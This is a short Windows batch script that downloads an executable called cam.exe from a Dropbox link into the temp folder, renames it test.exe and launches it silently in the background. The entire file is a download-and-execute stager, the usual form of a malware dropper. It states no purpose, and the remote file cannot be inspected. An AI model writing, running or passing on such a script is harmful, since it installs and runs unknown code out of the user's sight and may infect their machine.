@echo off
set url="https://www.dropbox.com/scl/fi/mg05nvuy4m9ha6f8ufydg/cam.exe?rlkey=juhcsisju6p3dc16p8g0gd8sd&st=e8sr06c8&dl=1"
set output="%TEMP%\test.exe"

curl -L %url% -o %output%

echo File downloaded to %output%

rem Run the downloaded .exe silently without opening a new command prompt window
start /B %output%

rem Optionally, you can pause the script to see if it completes correctly
pause
